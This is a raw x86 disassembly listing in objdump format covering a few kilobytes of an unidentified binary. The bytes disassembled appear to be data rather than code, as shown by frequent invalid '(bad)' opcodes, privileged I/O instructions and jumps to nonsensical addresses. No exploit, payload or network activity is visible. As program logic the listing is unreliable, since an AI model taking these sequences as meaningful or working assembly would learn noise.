  416e24:	les    ecx,FWORD PTR [edi-0x2]
  416e27:	pop    ds
  416e28:	dec    esp
  416e29:	jne    0x416dfb
  416e2b:	nop
  416e2c:	xchg   edx,eax
  416e2d:	adc    DWORD PTR [edi+0x3b],ecx
  416e30:	cwde   
  416e31:	push   0xffffffb9
  416e33:	cmc    
  416e34:	mov    dl,0xc6
  416e36:	pop    ds
  416e37:	js     0x416e83
  416e39:	jns    0x416dcc
  416e3b:	push   es
  416e3c:	(bad)  
  416e3e:	ror    BYTE PTR [ebp+0x3c],0xc4
  416e42:	or     esi,edi
  416e44:	jbe    0x416e77
  416e46:	sbb    BYTE PTR [edx+ebp*1-0x7b],ch
  416e4a:	mov    BYTE PTR [ecx-0x3a1858ff],al
  416e50:	jne    0x416e41
  416e52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416e53:	push   ds
  416e54:	(bad)  [edi]
  416e56:	ins    BYTE PTR es:[edi],dx
  416e57:	cs das 
  416e59:	loope  0x416e32
  416e5b:	rcr    al,0x22
  416e5e:	mov    WORD PTR [ecx],?
  416e60:	mov    eax,ds:0xa8edcdf4
  416e65:	out    dx,al
  416e66:	sub    DWORD PTR [edi],ebx
  416e68:	in     eax,dx
  416e69:	scas   eax,DWORD PTR es:[edi]
  416e6a:	push   edx
  416e6b:	inc    ebx
  416e6c:	cs js  0x416e79
  416e6f:	mov    al,ds:0xaf794c9a
  416e74:	cmc    
  416e75:	dec    esp
  416e76:	xchg   ecx,eax
  416e77:	out    dx,eax
  416e78:	mov    BYTE PTR [ecx+0x66931292],dl
  416e7e:	mov    BYTE PTR [edi],bl
  416e80:	rol    DWORD PTR [ebp-0x34a45044],cl
  416e86:	or     bh,BYTE PTR [edx+0x4ad001c0]
  416e8c:	dec    eax
  416e8d:	pop    edi
  416e8e:	std    
  416e8f:	or     ebx,edx
	...
  416ef1:	add    BYTE PTR [eax],al
  416ef3:	add    BYTE PTR [edi-0x519271e7],bh
  416ef9:	(bad)  
  416efa:	(bad)  
  416efb:	fucomi st,st(0)
  416efd:	xor    eax,0x5c278eea
  416f02:	lods   eax,DWORD PTR ds:[esi]
  416f03:	mov    cl,0x7c
  416f05:	repnz add BYTE PTR [eax],al
  416f08:	add    eax,0xc9000001
  416f0d:	dec    edx
  416f0e:	pop    es
  416f0f:	(bad)  [edx+0x63]
  416f12:	sar    DWORD PTR [edi-0x2b],cl
  416f15:	adc    ebx,ebx
  416f17:	mov    ch,0x93
  416f19:	xchg   esi,eax
  416f1a:	addr16 dec ebp
  416f1c:	add    esi,DWORD PTR cs:[esi]
  416f1f:	and    eax,0xfce6e8dc
  416f24:	push   cs
  416f25:	inc    esp
  416f26:	or     BYTE PTR [ebp-0x3fdd5674],0xdf
  416f2d:	fisub  WORD PTR [edx]
  416f2f:	pop    edi
  416f30:	inc    edi
  416f31:	sbb    edx,DWORD PTR [ecx-0x6dcb8d44]
  416f37:	in     eax,0x28
  416f39:	cwde   
  416f3a:	cmp    eax,0x6bdefa2b
  416f3f:	xchg   ecx,eax
  416f40:	pusha  
  416f41:	add    ebx,DWORD PTR [eax+0x4b]
  416f44:	xor    edi,DWORD PTR [esi+0x3c7f2638]
  416f4a:	jl     0x416ef1
  416f4c:	adc    edx,DWORD PTR [esi]
  416f4e:	mov    DWORD PTR [eax],edx
  416f50:	cmp    DWORD PTR [ecx-0x581b59b0],edx
  416f56:	push   cs
  416f57:	sbb    al,0xf3
  416f59:	cli    
  416f5a:	ja     0x416f64
  416f5c:	or     edx,DWORD PTR [eax+ebx*2+0x70]
  416f60:	push   es
  416f61:	ja     0x416f5b
  416f63:	mov    al,ds:0x68ebc99f
  416f68:	ret    0x90a3
  416f6b:	push   ss
  416f6c:	jmp    0xabe95e72
  416f71:	scas   al,BYTE PTR es:[edi]
  416f72:	jbe    0x416f94
  416f74:	ss push ss
  416f76:	mov    bh,0x87
  416f78:	jecxz  0x416f91
  416f7a:	mov    ds:0xd869b916,al
  416f7f:	imul   ebx,DWORD PTR [edx-0x9c32518],0xffffffec
  416f86:	(bad)  
  416f87:	mov    cl,0x82
  416f89:	icebp  
  416f8a:	jb     0x417004
  416f8c:	rol    edi,1
  416f8e:	add    esp,edx
  416f90:	cmc    
  416f91:	int    0x65
  416f93:	rcl    BYTE PTR [ecx-0x521ffbd6],cl
  416f99:	call   DWORD PTR [eax-0x79]
  416f9c:	jnp    0x416fba
  416f9e:	jg     0x41700b
  416fa0:	add    al,0x6e
  416fa2:	add    al,0x4e
  416fa4:	dec    esi
  416fa5:	gs push eax
  416fa7:	mov    ecx,0xbeca745f
  416fac:	add    BYTE PTR [edi],0x3d
  416faf:	and    al,0xda
  416fb1:	mov    ?,WORD PTR [ecx]
  416fb3:	lods   eax,DWORD PTR ds:[esi]
  416fb4:	div    BYTE PTR [ecx+0x20]
  416fb7:	dec    esi
  416fb8:	jecxz  0x41701f
  416fba:	out    dx,eax
  416fbb:	bound  edx,QWORD PTR [eax-0x46f03e87]
  416fc1:	sub    al,0xf1
  416fc3:	test   al,0x69
  416fc5:	call   0x9154670b
  416fca:	stos   BYTE PTR es:[edi],al
  416fcb:	dec    esp
  416fcc:	aad    0xe6
  416fce:	xchg   dh,al
  416fd0:	pop    edi
  416fd1:	mov    ebx,0x4ab3ef32
  416fd6:	mov    ds:0xe9d4ea95,al
  416fdb:	test   eax,0x9751ba6e
  416fe0:	retf   0xcc30
  416fe3:	adc    BYTE PTR [edx-0x71],bl
  416fe6:	aad    0x88
  416fe8:	pop    DWORD PTR [edi]
  416fea:	dec    esi
  416feb:	push   ds
  416fec:	stos   DWORD PTR es:[edi],eax
  416fed:	ror    ecx,0x82
  416ff0:	push   esp
  416ff1:	inc    edx
  416ff2:	jmp    0x93bf:0x823192ad
  416ff9:	jbe    0x417055
  416ffb:	xor    cl,BYTE PTR [eax+0x6220cf42]
  417001:	hlt    
  417002:	jmp    0xfc56:0xd6a45c93
  417009:	call   0xd5c2:0x6daadad3
  417010:	dec    ebx
	...
  417071:	add    BYTE PTR [eax],al
  417073:	add    BYTE PTR [esi+0x2d],dh
  417076:	push   ebp
  417077:	inc    ecx
  417078:	pop    edi
  417079:	jns    0x4170f1
  41707b:	aas    
  41707c:	(bad)  
  41707d:	loopne 0x417073
  41707f:	sub    ebp,DWORD PTR [ebx-0x7eb883e9]
  417085:	repz add BYTE PTR [eax],al
  417088:	add    eax,0xdf000001
  41708d:	jnp    0x417074
  41708f:	mov    ds:0x910a232a,al
  417094:	scas   al,BYTE PTR es:[edi]
  417095:	hlt    
  417096:	push   esp
  417097:	cmova  edx,DWORD PTR [edi-0x51]
  41709b:	add    al,0xec
  41709d:	push   eax
  41709e:	add    BYTE PTR [esi+0x24],dl
  4170a1:	fldcw  WORD PTR [edi+0x64]
  4170a4:	add    esi,DWORD PTR [edx-0x39]
  4170a7:	out    dx,al
  4170a8:	mov    BYTE PTR [edx-0x69],bl
  4170ab:	and    BYTE PTR [ecx-0x5aa4281a],dl
  4170b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4170b2:	test   bl,ch
  4170b4:	jmp    0x41b7be15
  4170b9:	(bad)  
  4170ba:	cmc    
  4170bb:	xor    al,0x1e
  4170bd:	push   cs
  4170be:	mov    edx,DWORD PTR [edi]
  4170c0:	xchg   esi,eax
  4170c1:	xor    BYTE PTR [esi-0x65ab9b7e],0x32
  4170c8:	xor    DWORD PTR [ebx-0x31],0xffffff88
  4170cc:	lahf   
  4170cd:	mov    ds:0x1a70a250,al
  4170d2:	cmp    eax,0xde685c53
  4170d7:	test   eax,0xd6aafeed
  4170dc:	aam    0x1e
  4170de:	cli    
  4170df:	mov    DWORD PTR [esp+edx*8+0x89e7acf],ebp
  4170e6:	je     0x4170d1
  4170e8:	fs (bad) 
  4170eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4170ec:	push   0x2c
  4170ee:	push   esp
  4170ef:	out    0xfd,al
  4170f1:	bnd jae 0x417160
  4170f4:	mov    ebx,0x1f755737
  4170f9:	mov    eax,esp
  4170fb:	lods   al,BYTE PTR ds:[esi]
  4170fc:	test   BYTE PTR [ecx],al
  4170fe:	xchg   esp,eax
  4170ff:	fdivr  st(7),st
  417101:	mov    BYTE PTR ds:0x8807cf28,bl
  417107:	xlat   BYTE PTR ds:[ebx]
  417108:	in     al,0xac
  41710a:	jmp    0xc6f4caf9
  41710f:	sahf   
  417110:	test   al,0xc5
  417112:	dec    edx
  417113:	push   cs
  417114:	mov    al,ds:0xa3cec8c3
  417119:	push   cs
  41711a:	push   es
  41711b:	into   
  41711c:	scas   eax,DWORD PTR es:[edi]
  41711d:	pop    edi
  41711e:	push   ss
  41711f:	cmp    al,0xea
  417121:	scas   al,BYTE PTR es:[edi]
  417122:	inc    edi
  417123:	inc    esi
  417124:	leave  
  417125:	loop   0x4170f6
  417127:	add    bl,BYTE PTR [esp+ebx*8]
  41712a:	test   eax,0x5f62d8c3
  41712f:	popa   
  417130:	rcl    DWORD PTR [ebp-0x79bd1890],cl
  417136:	(bad)  
  417138:	ror    ah,1
  41713a:	call   DWORD PTR [eax-0x68]
  41713d:	or     BYTE PTR [ebx-0x532847f3],0xc4
  417144:	mov    al,ds:0x9d60d1d0
  417149:	sub    ch,0x78
  41714c:	bound  ecx,QWORD PTR [edi+esi*4-0x30]
  417150:	add    al,0x70
  417152:	ror    BYTE PTR [eax-0x5306ddd6],0x90
  417159:	dec    esi
  41715a:	in     al,dx
  41715b:	pop    edx
  41715c:	int    0x6c
  41715e:	cmp    dl,BYTE PTR [ebx+0xb4b2819]
  417164:	mov    eax,ds:0x70f7f0ad
  417169:	js     0x41710b
  41716b:	mov    edi,0x5e34e618
  417170:	popf   
  417171:	or     al,0x7a
  417173:	sahf   
  417174:	je     0x41711d
  417176:	cmp    eax,0xe9e8ac3f
  41717b:	enter  0x6c14,0xb9
  41717f:	je     0x4171e7
  417181:	mov    edi,0xb7f8d197
  417186:	jp     0x41716f
  417188:	mov    edx,0xc7f351fd
  41718d:	clc    
  41718e:	pop    edi
  41718f:	sbb    bh,ah
	...
  4171f1:	add    BYTE PTR [eax],al
  4171f3:	add    BYTE PTR [esi-0xe58fe7],ah
  4171f9:	jnp    0x4171e9
  4171fb:	mov    ebp,0x986526a4
  417200:	test   BYTE PTR [ebp-0x1a],0xdf
  417204:	xchg   ah,dh
  417206:	add    BYTE PTR [eax],al
  417208:	add    eax,0x90000001
  41720d:	add    DWORD PTR [eax+0x19],esp
  417210:	pop    eax
  417211:	inc    ecx
  417212:	sti    
  417213:	stc    
  417214:	ror    ebp,cl
  417216:	into   
  417217:	loopne 0x4171ba
  417219:	xlat   BYTE PTR ds:[ebx]
  41721a:	mov    dl,0x6
  41721c:	test   DWORD PTR [esp+eiz*4+0x5d82314a],0xbe0b1cd6
  417227:	xchg   edi,eax
  417228:	mov    ds:0x229d5efe,eax
  41722d:	push   edi
  41722e:	std    
  41722f:	xor    cl,BYTE PTR [edx]
  417231:	push   0xffffff81
  417233:	jmp    0x4172b1
  417235:	sub    BYTE PTR [eax-0x66],al
  417238:	rol    DWORD PTR [ebx],1
  41723a:	add    ah,BYTE PTR [esi+0x766798c0]
  417240:	fistp  QWORD PTR [ecx+0x27]
  417243:	retf   
  417244:	cmc    
  417245:	adc    BYTE PTR [edx+0xa],ch
  417248:	(bad)  
  417249:	push   ss
  41724a:	lods   al,BYTE PTR ds:[esi]
  41724b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41724c:	add    eax,0x597f010d
  417251:	add    cl,BYTE PTR [eax-0x210d1e41]
  417257:	xor    eax,esi
  417259:	in     al,0x92
  41725b:	adc    DWORD PTR [ebp-0x69447324],ebp
  417261:	xchg   ebx,eax
  417262:	retf   
  417263:	cmp    eax,0x698eaa04
  417268:	out    0x3d,al
  41726a:	cmp    DWORD PTR [ebx+0x45],ebp
  41726d:	mov    eax,0x43518c40
  417272:	jp     0x4172d4
  417274:	test   eax,0x20fecea8
  417279:	int3   
  41727a:	retf   
  41727b:	ds pop ds
  41727d:	cmp    DWORD PTR [esi+0x76],eax
  417280:	xor    edx,DWORD PTR [ebp+0x5b]
  417283:	not    BYTE PTR [edx]
  417285:	sbb    BYTE PTR [esi+0x49585040],ch
  41728b:	cmp    esp,DWORD PTR [eax+0x30]
  41728e:	xchg   edx,eax
  41728f:	inc    BYTE PTR [ecx+0x4d]
  417292:	in     al,dx
  417293:	mov    al,0xbd
  417295:	div    BYTE PTR [edi+0x6f37794a]
  41729b:	adc    DWORD PTR [edi+0x3e269eb6],edi
  4172a1:	inc    edi
  4172a2:	sbb    bl,BYTE PTR [ecx+0x3ce7de61]
  4172a8:	adc    al,0x69
  4172aa:	fnsave ds:0xb3e9ef78
  4172b0:	retf   
  4172b1:	jl     0x41726a
  4172b3:	adc    BYTE PTR [edi+0x6b],ch
  4172b6:	xor    DWORD PTR [esi+eiz*4],edx
  4172b9:	pop    ss
  4172ba:	lea    edx,[ebp-0x18b4322c]
  4172c0:	mov    dl,bl
  4172c2:	je     0x4172d6
  4172c4:	ror    DWORD PTR [ebx-0x37],1
  4172c7:	xor    ecx,edx
  4172c9:	cmp    ebp,DWORD PTR [esi+0x3b]
  4172cc:	mov    dh,0xba
  4172ce:	rcl    DWORD PTR [ecx-0x4],1
  4172d1:	inc    ebp
  4172d2:	mov    BYTE PTR [edx-0x2f],dh
  4172d5:	test   al,0xfd
  4172d7:	jmp    0x41727d
  4172d9:	(bad)
  4172dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4172dd:	cmp    DWORD PTR [ecx+0x8d3bb47],eax
  4172e3:	into   
  4172e4:	jge    0x41727c
  4172e6:	(bad)
  4172e9:	sub    edi,DWORD PTR [ebp+0x4c]
  4172ec:	dec    ebp
  4172ed:	adc    BYTE PTR [edx+0x74],cl
  4172f0:	mov    WORD PTR [esi-0x19985851],ss
  4172f6:	xchg   ebx,eax
  4172f7:	stos   DWORD PTR es:[edi],eax
  4172f8:	lock and BYTE PTR [ebp+0x558b3140],cl
  4172ff:	sub    ch,al
  417301:	sub    al,0x1a
  417303:	repz dec edx
  417305:	packssdw mm2,QWORD PTR [ebp+esi*1-0x23d1ccaf]
  41730d:	pop    edi
  41730e:	dec    edx
  41730f:	lods   al,BYTE PTR ds:[esi]
  417310:	fiadd  DWORD PTR [eax]
	...
  417372:	add    BYTE PTR [eax],al
  417374:	imul   edi,DWORD PTR [edi+edx*8-0x168028a2],0x8016bbf
  41737f:	gs push esp
  417381:	(bad)  
  417382:	jg     0x4173d9
  417384:	mov    esi,ebp
  417386:	add    BYTE PTR [eax],al
  417388:	add    eax,0xba000001
  41738d:	aas    
  41738e:	call   0x64f2:0x56a3866a
  417395:	sub    ebp,ecx
  417397:	dec    ebp
  417398:	sub    esi,DWORD PTR [edi]
  41739a:	mov    DWORD PTR [ebp+0x59fdcab3],ebp
  4173a0:	stc    
  4173a1:	inc    eax
  4173a2:	mov    edi,0x621c6a53
  4173a7:	push   es
  4173a8:	loop   0x41732a
  4173aa:	fidiv  WORD PTR [ecx-0x34]
  4173ad:	imul   ecx,DWORD PTR [edx],0xffffffef
  4173b0:	fstp   QWORD PTR [edi-0x31edc81]
  4173b6:	and    eax,0x40a9af
  4173bb:	xchg   ecx,eax
  4173bc:	mov    bh,0xa9
  4173be:	push   esi
  4173bf:	leave  
  4173c0:	push   ds
  4173c1:	out    dx,eax
  4173c2:	xacquire xchg BYTE PTR [ebx+ebx*4-0x3d],al
  4173c7:	sar    BYTE PTR [ebp+0x37],cl
  4173ca:	xchg   edi,esp
  4173cc:	dec    edi
  4173cd:	out    0x81,al
  4173cf:	es inc eax
  4173d1:	push   esi
  4173d2:	push   cs
  4173d3:	xchg   DWORD PTR [ecx-0x3f],ebx
  4173d6:	js     0x4173d2
  4173d8:	mov    cs,WORD PTR [esi]
  4173da:	and    DWORD PTR [ebp+0x3d0e6a7e],0x1077e07
  4173e4:	add    ebp,DWORD PTR [esi+0x4f]
  4173e7:	gs inc edi
  4173e9:	push   eax
  4173ea:	and    eax,0xfb51b185
  4173ef:	push   ebx
  4173f0:	jp     0x41739e
  4173f2:	adc    BYTE PTR [ebx+ebp*8+0x74],dh
  4173f6:	dec    edi
  4173f7:	inc    ebx
  4173f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4173f9:	cs pop ebx
  4173fb:	xor    eax,0xaf50768
  417400:	stos   DWORD PTR es:[edi],eax
  417401:	jmp    FWORD PTR [ebx-0x30]
  417404:	or     DWORD PTR [ebp+ecx*8-0x1],ecx
  417408:	pop    ds
  417409:	stos   BYTE PTR es:[edi],al
  41740a:	outs   dx,BYTE PTR ds:[esi]
  41740b:	ror    BYTE PTR [edx-0x6e],0x7a
  41740f:	xor    esp,DWORD PTR [edi-0x28a2c4ea]
  417415:	outs   dx,BYTE PTR ds:[esi]
  417416:	add    al,0x55
  417418:	ins    BYTE PTR es:[edi],dx
  417419:	fs ja  0x41748b
  41741c:	pop    es
  41741d:	sbb    eax,0x86833411
  417422:	mov    esp,0x79bcf870
  417427:	fcomip st,st(3)
  417429:	pop    esp
  41742a:	ret    
  41742b:	sub    dh,BYTE PTR [ecx]
  41742d:	and    ch,BYTE PTR [ebx+0x41]
  417430:	sbb    DWORD PTR [eax],edi
  417432:	xor    bh,BYTE PTR [esi+0x232f0a4c]
  417438:	or     eax,DWORD PTR [ebp+eiz*1+0x79ae2db1]
  41743f:	mov    esi,0x664e2a0f
  417444:	mov    ds:0x53130899,al
  417449:	shl    BYTE PTR cs:[edx+0x3e],cl
  41744d:	push   ss
  41744e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41744f:	xor    al,BYTE PTR [edi]
  417451:	cmp    eax,esp
  417453:	sar    BYTE PTR [edi+0x68],1
  417456:	jp     0x41746d
  417458:	xchg   ebp,eax
  417459:	mov    es,WORD PTR [ecx]
  41745b:	nop
  41745c:	sbb    cl,0x58
  41745f:	mov    dl,0x43
  417461:	xor    DWORD PTR [eax+0x42af85c1],edi
  417467:	mov    dh,0xb5
  417469:	jb     0x4174ea
  41746b:	inc    esi
  41746c:	call   0x9a98aa65
  417471:	stos   DWORD PTR es:[edi],eax
  417472:	addr16 mov ds:0x976e,eax
  417476:	cmp    DWORD PTR [esi+0x35],edx
  417479:	push   edi
  41747a:	lock (bad) 
  41747c:	fwait
  41747d:	sub    eax,0x83a1db46
  417482:	sbb    dh,BYTE PTR [esi-0x61474f8e]
  417488:	in     al,dx
  417489:	adc    DWORD PTR [esi-0x57],ebx
  41748c:	inc    ebx
  41748d:	lea    esi,[ebx+0xf3da]
	...
  4174f3:	add    BYTE PTR [ecx+0x6b0c6aba],dl
  4174f9:	fdivr  st(7),st
  4174fb:	mov    edi,0x212a686b
  417500:	int3   
  417501:	dec    edx
  417502:	test   eax,0xf69037
  417507:	add    BYTE PTR ds:0x15000001,al
  41750d:	adc    dl,BYTE PTR [eax+0x63f186f2]
  417513:	fiadd  WORD PTR [ecx]
  417515:	mov    al,ds:0xc87a5679
  41751a:	pop    eax
  41751b:	lock mov dl,0x8c
  41751e:	mov    dl,0xe8
  417520:	jmp    esp
  417522:	cmc    
  417523:	rol    BYTE PTR gs:[esi+0x2b],1
  417527:	lea    edx,[ebp-0x28e97a3e]
  41752d:	cmp    DWORD PTR [eax*4+0x8e716e1],esi
  417534:	repz add ah,ch
  417537:	fwait
  417538:	push   es
  417539:	cld    
  41753a:	fs jl  0x417579
  41753d:	ret    
  41753e:	mov    ecx,0x9e86fc6a
  417543:	mov    bl,0xd4
  417545:	jnp    0x41757b
  417547:	push   ss
  417548:	loop   0x4175b0
  41754a:	aaa    
  41754b:	fimul  WORD PTR [ebx+0x268b0a60]
  417551:	or     DWORD PTR [ecx],edx
  417553:	int3   
  417554:	inc    ebx
  417555:	jle    0x417551
  417557:	(bad)  
  417558:	mov    esp,0xba1c85df
  41755d:	retf   0x8be5
  417560:	xchg   edi,eax
  417561:	not    DWORD PTR [ebp+0x4b]
  417564:	jge    0x4174f2
  417566:	clc    
  417567:	(bad)  
  417568:	push   ecx
  417569:	addr16 or al,0xa1
  41756c:	in     eax,dx
  41756d:	neg    DWORD PTR [esp+ebx*8+0xd]
  417571:	rcr    esp,1
  417573:	jb     0x417595
  417575:	lods   al,BYTE PTR ds:[esi]
  417576:	fcomp  st(7)
  417578:	mov    dh,0xf7
  41757a:	shl    DWORD PTR [ebx+0x11c57de0],1
  417580:	mov    al,0xd4
  417582:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417583:	dec    esp
  417584:	popa   
  417585:	mov    DWORD PTR [ebp-0x10],ecx
  417588:	nop
  417589:	and    DWORD PTR [ebx+eax*4],0xe583ac3c
  417590:	xchg   edi,eax
  417591:	es stos DWORD PTR es:[edi],eax
  417593:	ror    BYTE PTR [ecx+0x5d679b3e],0xbf
  41759a:	inc    esi
  41759b:	mov    esp,0xb78caed0
  4175a0:	inc    edx
  4175a1:	arpl   WORD PTR [esi+ebx*2-0x8103f42],ax
  4175a8:	pop    edx
  4175a9:	mov    bh,0x2b
  4175ab:	push   ebp
  4175ac:	shl    DWORD PTR es:[esi+0x4f12db3],0xbc
  4175b4:	xor    BYTE PTR [ebx-0x14],bl
  4175b7:	sub    cl,BYTE PTR [edx+0xa2046c6]
  4175bd:	xor    cl,al
  4175bf:	mov    esp,0x8c5ade62
  4175c4:	adc    eax,0x89d5ad7a
  4175c9:	out    0x8c,eax
  4175cb:	int    0x9e
  4175cd:	aad    0x76
  4175cf:	pop    ebp
  4175d0:	mov    BYTE PTR [eax-0x2da817b2],0x13
  4175d7:	dec    ebx
  4175d8:	shr    BYTE PTR [eax-0x3b],0xf9
  4175dc:	push   esp
  4175dd:	push   es
  4175de:	gs out dx,eax
  4175e0:	jnp    0x41763a
  4175e2:	sti    
  4175e3:	fisttp WORD PTR [eax-0x2517b7c6]
  4175e9:	enter  0xc988,0xc1
  4175ed:	out    dx,eax
  4175ee:	cwde   
  4175ef:	cmp    DWORD PTR [ebx+0x6f4d1969],edi
  4175f5:	fs dec edi
  4175f7:	add    ah,BYTE PTR ds:0xe508c93c
  4175fd:	jnp    0x4175de
  4175ff:	mov    esi,ss
  417601:	cmp    esi,0x6fcc806f
  417607:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417608:	rcl    DWORD PTR [edx+edi*4],cl
  41760b:	xchg   ebp,eax
  41760c:	test   BYTE PTR [eax+0x56],dh
  41760f:	sbb    esp,DWORD PTR [eax+eax*1]
	...
  417672:	add    BYTE PTR [eax],al
  417674:	test   eax,0xdf4fd367
  417679:	(bad)  
  41767a:	mov    ebp,0x411f24e7
  41767f:	fisub  DWORD PTR [ebx+ebx*1]
  417682:	clc    
  417683:	mov    dl,BYTE PTR [ebp+0x50000f7]
  417689:	add    DWORD PTR [eax],eax
  41768b:	add    ah,dh
  41768d:	xchg   ebp,eax
  41768e:	adc    BYTE PTR [esi+0x164753ef],bl
  417694:	(bad)  
  417695:	inc    esi
  417696:	sbb    al,0x2b
  417698:	arpl   sp,sp
  41769a:	arpl   WORD PTR [esi],cx
  41769c:	loopne 0x4176f2
  41769e:	inc    ecx
  41769f:	out    dx,eax
  4176a0:	popf   
  4176a1:	and    bh,BYTE PTR [edx]
  4176a3:	xchg   ebp,eax
  4176a4:	adc    bl,BYTE PTR [eax-0x1b374509]
  4176aa:	pop    edx
  4176ab:	mov    al,0x3c
  4176ad:	jmp    0x453a7a41
  4176b2:	out    0xf2,eax
  4176b4:	dec    edx
  4176b5:	or     eax,0x40cb2754
  4176ba:	xor    WORD PTR [ebx+edi*4+0x66],0x2933
  4176c1:	mov    ecx,fs
  4176c3:	sbb    eax,0x3778bdb3
  4176c8:	outs   dx,BYTE PTR ds:[esi]
  4176c9:	jnp    0x4176e3
  4176cb:	loop   0x4176ab
  4176cd:	mov    ah,dh
  4176cf:	pop    edx
  4176d0:	scas   al,BYTE PTR es:[edi]
  4176d1:	cs je  0x41771a
  4176d4:	pushf  
  4176d5:	dec    esp
  4176d6:	leave  
  4176d7:	adc    al,BYTE PTR [eax-0x269f4d5d]
  4176dd:	icebp  
  4176de:	cmc    
  4176df:	pop    esi
  4176e0:	mov    ebx,0xec673524
  4176e5:	shl    DWORD PTR [eax+0x10],1
  4176e8:	div    DWORD PTR [esi+edi*8+0x34]
  4176ec:	fsubr  QWORD PTR [edi]
  4176ee:	mov    edx,0xfcbff2aa
  4176f3:	aam    0xc9
  4176f5:	jmp    0x44eba29e
  4176fa:	sub    eax,0x8c16238f
  4176ff:	and    al,0xb
  417701:	popa   
  417702:	push   es
  417703:	push   0x2b1c4de8
  417708:	mov    cs,WORD PTR [esi+0x46]
  41770b:	ret    0xd687
  41770e:	pusha  
  41770f:	fidivr DWORD PTR [edx]
  417711:	sbb    eax,ebp
  417713:	jecxz  0x41777d
  417715:	test   al,0x65
  417717:	sbb    al,0x94
  417719:	int    0x1e
  41771b:	add    ah,BYTE PTR [ecx+0x6b]
  41771e:	mov    ecx,0x6e6d6a0d
  417723:	aaa    
  417724:	cmp    ebp,ebx
  417726:	in     eax,0xe5
  417728:	aas    
  417729:	dec    ebp
  41772a:	adc    al,0x42
  41772c:	sbb    eax,DWORD PTR [edi-0x75aedd34]
  417732:	dec    eax
  417733:	fiadd  WORD PTR ds:0x38d99968
  417739:	arpl   WORD PTR [ebx],bx
  41773b:	xor    edx,DWORD PTR [edi]
  41773d:	pusha  
  41773e:	and    eax,0x316a6011
  417743:	ror    dh,0x5a
  417746:	outs   dx,BYTE PTR ds:[esi]
  417747:	ds push es
  417749:	add    BYTE PTR [ebx-0x7a3e4435],bl
  41774f:	ss scas al,BYTE PTR es:[edi]
  417751:	mov    cl,0x2e
  417753:	push   eax
  417754:	nop
  417755:	add    dl,BYTE PTR [edx-0x66]
  417758:	xchg   esi,ebx
  41775a:	xor    eax,0x739737f0
  41775f:	cmp    eax,0x51f76cdb
  417764:	adc    esi,edx
  417766:	dec    edi
  417767:	test   DWORD PTR ds:0xe17f7f4,edx
  41776d:	ins    DWORD PTR es:[edi],dx
  41776e:	das    
  41776f:	xor    BYTE PTR [ebx-0x461f57fe],0xa6
  417776:	push   esp
  417777:	add    eax,0x72ad4cea
  41777c:	push   ecx
  41777d:	rcr    edx,cl
  41777f:	cld    
  417780:	jno    0x417770
  417782:	bound  edi,QWORD PTR [ecx]
  417784:	jbe    0x417717
  417786:	loop   0x417791
  417788:	inc    edi
  417789:	out    dx,eax
  41778a:	mov    eax,DWORD PTR [eax+0x6b]
  41778d:	repz adc eax,0xb6bb
	...
  4177f3:	add    cl,ch
  4177f5:	push   cs
  4177f6:	(bad)  
  4177f7:	pop    ss
  4177f8:	push   edi
  4177fa:	jmp    0x233417fd
  4177ff:	rol    al,cl
  417801:	xor    al,0x6b
  417803:	iret   
  417804:	call   0x1:0x50000f8
  41780b:	add    BYTE PTR [esi-0x56c0ab98],dl
  417811:	and    ah,cl
  417813:	ret    
  417814:	repnz push ss
  417816:	not    esp
  417818:	sbb    DWORD PTR [edx],esi
  41781a:	push   ebx
  41781b:	ins    BYTE PTR es:[edi],dx
  41781c:	mov    ch,0xd0
  41781e:	(bad)  
  41781f:	xchg   ecx,eax
  417820:	inc    edx
  417821:	and    ebp,DWORD PTR [esi+esi*8+0x25]
  417825:	sbb    DWORD PTR [edx+0x2e4ea9],ebx
  41782b:	and    al,0x1a
  41782d:	xchg   edi,eax
  41782e:	sbb    al,0xa3
  417830:	xchg   BYTE PTR [ebp+0x27],bl
  417833:	bound  ebx,QWORD PTR [edx-0x28115007]
  417839:	and    DWORD PTR [bx+di],eax
  41783c:	mov    ds:0xa137484d,eax
  417841:	mov    dl,0xc3
  417843:	adc    dh,0xf8
  417846:	scas   eax,DWORD PTR es:[edi]
  417847:	or     BYTE PTR [ecx],dl
  417849:	cmp    al,0xc
  41784b:	(bad)  
  41784c:	sbb    DWORD PTR [edx-0x3d],esp
  41784f:	adc    esp,DWORD PTR [ebp-0x21365340]
  417855:	stos   DWORD PTR es:[edi],eax
  417856:	fs int 0x6e
  417859:	xor    eax,0xd31dbf
  41785e:	iret   
  41785f:	imul   edi,ecx,0xb6bbef7a
  417865:	test   DWORD PTR [eax-0x58],ecx
  417868:	mov    al,ds:0x52be2bc5
  41786d:	sbb    DWORD PTR [edi+eiz*8+0x2ca2474a],ebp
  417874:	ss xchg ebx,eax
  417876:	retf   0x4776
  417879:	loopne 0x41780f
  41787b:	in     eax,0x44
  41787d:	cmp    BYTE PTR [ebp+0x56],0x2e
  417881:	es cmp ebp,edi
  417884:	imul   eax,DWORD PTR [ecx],0x2d
  417887:	loopne 0x4178ee
  417889:	inc    eax
  41788a:	jl     0x4178a8
  41788c:	inc    edi
  41788d:	xchg   ecx,eax
  41788e:	push   ds
  41788f:	call   0x4880:0xddf1376f
  417896:	add    DWORD PTR [esi+0x70],ebp
  417899:	int3   
  41789a:	xor    cl,ch
  41789c:	cli    
  41789d:	shr    ch,1
  41789f:	sub    ah,BYTE PTR [eax-0x3c1c71ae]
  4178a5:	xchg   ecx,eax
  4178a6:	in     eax,0xfa
  4178a8:	rcl    dh,0x82
  4178ab:	call   0x48ed04e5
  4178b0:	xchg   edi,eax
  4178b1:	sbb    edx,DWORD PTR [ecx-0x3e5e61ef]
  4178b7:	jle    0x4178b1
  4178b9:	das    
  4178ba:	or     dh,0xe4
  4178bd:	cmp    al,0x31
  4178bf:	mov    esp,0x8770125
  4178c4:	mov    al,dh
  4178c6:	jecxz  0x4178e7
  4178c8:	iret   
  4178c9:	add    dh,cl
  4178cb:	das    
  4178cc:	addr16 xchg ecx,eax
  4178ce:	jno    0x417937
  4178d0:	int    0x1d
  4178d2:	pop    edi
